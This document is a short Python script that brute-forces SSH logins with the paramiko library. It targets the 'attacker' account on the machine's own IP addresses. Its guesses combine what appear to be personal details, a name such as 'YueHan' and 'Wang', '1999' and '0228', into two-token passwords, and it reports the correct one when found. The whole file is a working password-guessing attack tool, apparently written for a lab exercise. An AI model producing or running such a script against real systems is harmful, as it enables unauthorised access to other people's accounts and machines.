import paramiko,os,sys,subprocess

def SSH_Connect(password):
    username = 'attacker'
    hostname = subprocess.check_output(["hostname","--all-ip-addresses"]).strip().decode('utf-8')
    print('[*] Testing ssh to' + username + '@' + hostname + ' with password: ' + password)
    ssh = paramiko.client.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname,port = 22,username = username,password = password)
    except paramiko.AuthenticationException:
        print('\tWrong password, try another...orz')
        ssh.close()
    except KeyboardInterrupt:
        ssh.close()
        print('\nKeyboardInterrupt received')
        exit(0)
    else:
        print('\tCorrect password!!!\n\tpassword: ' + password)
        ssh.close()
        exit(0)

def main():
    passwdlist = ['YueHan','Wang','YH','1999','0228','oscar','Realtek','@','_']
    for w1 in passwdlist:
        for w2 in passwdlist:
            if w1 != w2:
                SSH_Connect(w1 + w2)
    

if __name__ == '__main__':
    main()